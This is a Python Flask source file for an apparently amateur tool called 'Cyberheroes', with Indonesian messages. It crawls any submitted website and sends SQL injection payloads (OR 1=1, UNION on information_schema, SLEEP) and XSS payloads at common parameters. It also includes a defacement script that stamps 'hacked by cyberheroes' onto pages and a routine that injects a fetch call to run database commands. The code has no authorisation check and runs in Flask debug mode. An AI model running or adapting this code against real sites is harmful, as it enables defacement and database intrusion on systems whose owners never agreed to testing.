import flask
from flask import request, jsonify
import mysql.connector
import html
import requests
from urllib.parse import urljoin, urlparse
import ssl
import socket
from bs4 import BeautifulSoup

app = flask.Flask(__name__)
R = '\033[91m'  # Red
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
B = '\033[94m'  # Blue
M = '\033[95m'  # Magenta
C = '\033[96m'  # Cyan
N = '\033[0m'   # Reset

def banner():
    print(f"""{G}
-------------------------{R}######{G}-------------------------
---------------------{R}######{G}--{R}######{G}---------------------
------------------{R}###{G}--------------{R}###{G}------------------
---------------{R}####{G}------------------{R}####{G}---------------
--------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
--------------{R}##{G}------------------------{R}##{G}--------------
-------------{R}#{G}----------------------------{R}#{G}-------------
------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
-------------------------{R}######{G}-------------------------
-----------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
---------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
--------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
-----------------{R}######################{G}-----------------
-------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
--------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
---------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
-----------{R}##{G}------------------------------{R}##{G}-----------
-------{R}#####{G}--------------------------------{R}#####{G}-------
----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
--------------------------------------------------------
--------------------------------------------------------
----------------------{R}#{G}----------{R}#{G}----------------------
----------------------{R}#{G}----------{R}#{G}----------------------
---------------------------------{R}#{G}----------------------
    """)
    print("Printing banner...")
    print(f"{R}                                                                                   {N}")
    print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
    print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
    print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
    print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
    print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
    print(f"{Y}        `---'                                                                       {N}")
    print("Banner printed.")  

def check_https(url):
    parsed_url = urlparse(url)
    return parsed_url.scheme == 'https'

def check_security_headers(url):
    try:
        response = requests.get(url)
        headers = response.headers
        security_headers = {
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'Content-Security-Policy': headers.get('Content-Security-Policy')
        }
        return security_headers
    except requests.RequestException:
        return "Tidak dapat mengakses URL"

# ini jaangan di ubah kontol
def detect_input_forms(url):
    try:
        response = requests.get(url)
        if '<form' in response.text.lower():
            return "Form input terdeteksi. Perhatikan keamanan input."
        return "Tidak ada form input yang terdeteksi."
    except requests.RequestException:
        return "Tidak dapat mengakses URL"

# jangan di ubah kontol
class SQLInjectionBot:
    def __init__(self, base_url):
        self.base_url = base_url
        self.payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT NULL, table_name FROM information_schema.tables --",
            "' AND SLEEP(5) --"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
        self.xss_change_appearance_payload = '''
        <script>
        document.body.style.backgroundColor = 'black';
        document.body.style.color = 'lime';
        var h1 = document.createElement('h1');
        h1.textContent = 'This site has been hacked by cyberheroes!';
        document.body.insertBefore(h1, document.body.firstChild);
        </script>
        '''

    def change_web_appearance(self, endpoint):
        print(f"\nAttempting to change web appearance via XSS: {endpoint}\n")
        try:
            response = requests.get(endpoint, params={"input": self.xss_change_appearance_payload}, timeout=10)
            if self.xss_change_appearance_payload in response.text:
                return "XSS payload for changing appearance was successfully injected"
            else:
                return "Failed to inject XSS payload for changing appearance"
        except requests.exceptions.RequestException as e:
            return f"Error: {str(e)}"

    def test_xss(self, endpoint):
        print(f"\nTesting endpoint for XSS: {endpoint}\n")
        results = []
        for payload in self.xss_payloads:
            try:
                response = requests.get(endpoint, params={"input": payload}, timeout=10)
                if payload in response.text:
                    status = "Potential XSS Vulnerability Detected"
                else:
                    status = "No XSS Issue"
                results.append((payload, response.status_code, status))
            except requests.exceptions.RequestException as e:
                results.append((payload, "Error", str(e)))
        return results

    def execute_db_command(self, endpoint, command):
        print(f"\nAttempting to execute DB command via XSS: {command}\n")
        payload = f"<script>fetch('{endpoint}?cmd={command}').then(r=>r.text()).then(console.log)</script>"
        try:
            response = requests.get(endpoint, params={"input": payload}, timeout=10)
            return response.text
        except requests.exceptions.RequestException as e:
            return f"Error: {str(e)}"

    def find_endpoints_and_params(self):
        print("\nFinding endpoints and parameters from the base URL...\n")
        try:
            response = requests.get(self.base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            endpoints = set()
            # Find all links on the page
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('/'):
                    href = urljoin(self.base_url, href)
                parsed = urlparse(href)
                if parsed.netloc == urlparse(self.base_url).netloc:
                    endpoints.add(href)

            print(f"Found {len(endpoints)} endpoints:\n")
            for endpoint in endpoints:
                print(endpoint)

            return list(endpoints)
        except requests.exceptions.RequestException as e:
            print(f"Error finding endpoints: {e}")
            return []

    def test_endpoint_for_params(self, endpoint):
        print(f"\nTesting endpoint for parameters: {endpoint}\n")
        params_to_test = ["id", "query", "search", "name", "user"]
        results = []
        for param in params_to_test:
            for payload in self.payloads:
                try:
                    response = requests.get(endpoint, params={param: payload}, timeout=10)
                    status = "Potential Vulnerability Detected" if response.status_code == 200 else "No Issue"
                    results.append((param, payload, response.status_code, status))
                except requests.exceptions.RequestException as e:
                    results.append((param, payload, "Error", str(e)))

        return results

def bot_response(message):
    message = message.lower()
    if "halo" in message or "hai" in message:
        return "Halo! Bagaimana saya bisa membantu Anda dengan pengujian keamanan hari ini?"
    elif "sql injection" in message:
        return "Untuk menguji SQL injection, gunakan endpoint /test_sql_injection dengan permintaan POST."
    elif "xss" in message:
        return "Untuk menguji kerentanan XSS, gunakan endpoint /test_xss dengan permintaan POST."
    elif "uji website" in message:
        return "Untuk menguji sebuah website, gunakan endpoint /test_website dengan permintaan POST yang berisi URL."
    elif "bantuan" in message:
        return "Perintah yang tersedia: halo, sql injection, xss, uji website, bantuan"
    else:
        return "Maaf, saya tidak mengerti perintah tersebut. Ketik 'bantuan' untuk daftar perintah yang tersedia."

@app.route('/test_website', methods=['POST'])
def api_test_website():
    data = request.json
    url = data.get('url')
    if not url:
        return jsonify({"error": "URL tidak disediakan"}), 400
    
    results = {
        "https": check_https(url),
        "header_keamanan": check_security_headers(url),
        "form_input": detect_input_forms(url)
    }
    return jsonify(results)

@app.route('/test_sql_injection', methods=['POST'])
def api_test_sql_injection():
    data = request.json
    url = data.get('url')
    if not url:
        return jsonify({"error": "URL tidak disediakan"}), 400
    
    bot = SQLInjectionBot(url)
    endpoints = bot.find_endpoints_and_params()
    
    if not endpoints:
        return jsonify({"error": "Tidak ada endpoint ditemukan"}), 400

    all_results = []
    for endpoint in endpoints:
        results = bot.test_endpoint_for_params(endpoint)
        all_results.extend(results)

    return jsonify({"results": all_results})

@app.route('/bot', methods=['POST'])
def api_bot():
    data = request.json
    message = data.get('message', '')
    response = bot_response(message)
    return jsonify({"respons": response})

if __name__ == '__main__':
    banner()
    app.run(debug=True)
